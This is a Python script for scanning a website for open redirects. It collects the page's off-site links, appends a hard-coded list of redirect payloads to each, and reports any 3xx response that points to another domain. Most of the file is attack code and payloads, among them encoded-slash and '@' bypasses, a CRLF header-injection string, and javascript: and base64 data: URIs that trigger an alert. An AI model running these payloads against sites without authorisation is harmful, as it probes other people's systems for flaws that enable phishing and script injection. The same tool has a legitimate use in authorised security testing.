import requests
from bs4 import BeautifulSoup
from urllib.parse import urlparse, urljoin
import time
import sys

def is_valid_url(url):
    try:
        result = urlparse(url)
        return all([result.scheme, result.netloc])
    except ValueError:
        return False

def find_redirects(url):
    try:
        response = requests.get(url)
    except requests.exceptions.RequestException:
        return []

    soup = BeautifulSoup(response.content, 'html.parser')
    links = soup.find_all('a')

    redirects = []

    for link in links:
        href = link.get('href')
        if href and is_valid_url(href):
            parsed_href = urlparse(href)
            if parsed_href.netloc != urlparse(url).netloc:
                redirects.append(href)

    return redirects

def test_open_redirects(base_url, external_links, payloads, delay):
    vulnerable_links = []

    for link in external_links:
        for payload in payloads:
            payload = payload.replace('example.com', base_url)
            test_url = urljoin(link, payload)
            print(f"Testing: {test_url}")  # Add this line to show progress
            try:
                response = requests.get(test_url, allow_redirects=False, timeout=5)
            except requests.exceptions.RequestException:
                continue

            if response.status_code in (301, 302, 303, 307, 308):
                redirect_url = response.headers.get('Location')
                if redirect_url and urlparse(redirect_url).netloc != urlparse(base_url).netloc:
                    vulnerable_links.append((link, redirect_url))
                    break  # No need to test other payloads for the same link

            time.sleep(delay)

    return vulnerable_links

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Usage: python script_name.py <target_url>")
        sys.exit(1)

    target_url = sys.argv[1]
    open_redirect_payloads = [
        '//www.cheese.com',
        'https://%2f%2fwww.cheese.com',
        'https://www.cheese.com@example.com',
        'https://www.cheese.com%00@example.com',
        'https://www.cheese.com%0d%0aLocation:%20https://www.cheese.com',
        'javascript:alert("Redirected%20to%20www.cheese.com")',
        'data:text/html;base64,PHNjcmlwdD5hbGVydCgnUmVkaXJlY3RlZCB0byBjaGVlc2UuY29tJyk8L3NjcmlwdD4=',
        'https://example.com/redirect?url=https://www.cheese.com',
        'https://example.com/redirect?next=//www.cheese.com',
        '/redirect?url=//www.cheese.com',
        '/redirect?next=%2f%2fwww.cheese.com',
        '?url=https://www.cheese.com',
        '?next=https://www.cheese.com',
        '?url=//www.cheese.com',
        '?next=//www.cheese.com',
        '?url=%2f%2fwww.cheese.com',
        '?next=%2f%2fwww.cheese.com',
        '?url=%2F%2Fwww.cheese.com',
        '?next=%2F%2Fwww.cheese.com',
        'hTTps://www.cheese.com',
        '//example.com/redirect?url=//www.cheese.com',
        'https://another-domain.com/redirect?url=https://www.cheese.com',
       
    ]
    request_delay = 1  # Adjust the delay between requests (in seconds)

    external_links = find_redirects(target_url)
    vulnerable_links = test_open_redirects(target_url, external_links, open_redirect_payloads, request_delay)

    if vulnerable_links:
        print('Open redirects found:')
        for link, redirect_url in vulnerable_links:
            print(f'{link} -> {redirect_url}')
    else:
        print('No open redirects found.')